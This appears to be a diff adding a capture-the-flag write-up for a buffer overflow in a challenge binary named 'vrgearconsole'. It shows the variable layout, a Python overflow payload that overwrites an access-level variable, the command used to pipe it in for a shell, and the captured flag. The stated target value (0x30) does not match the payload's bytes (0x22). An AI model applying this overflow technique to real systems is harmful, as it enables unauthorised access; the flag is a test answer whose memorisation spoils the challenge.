@@ -1,0 +1,19 @@
+1- by opening the source we see the location of the variables:
+int accessLevel = 0xff;
+char username[16];
+char password[32];
+
+2- We also see that it is possible to overflow both variables and that accessLevel has to have a value of 0x30
+
+3- I chose to overflow password variable (even if username is also possible) and I wrote this simple python script which I output in a file
+#!/usr/bin/python
+print 'a' # this is for the username
+print 'a'*(31+15+2) + "22000000".decode('hex') # this is for the password and payload
+
+4- with the resulting file of the script I executed this command which gave me the shell
+cat /tmp/okay - | ./vrgearconsole 
+
+5- with the shell, I was able to read the flag:
+295aa5afa0b825072f47c9d40b49cc6f
+
+*Something funny is that I realized the source was available after solving the challenge. I realized an overflow was possible because of a segmentation fault when inputing too much data. Then, I found the correct accessLevel value to overwrite with trial and error.
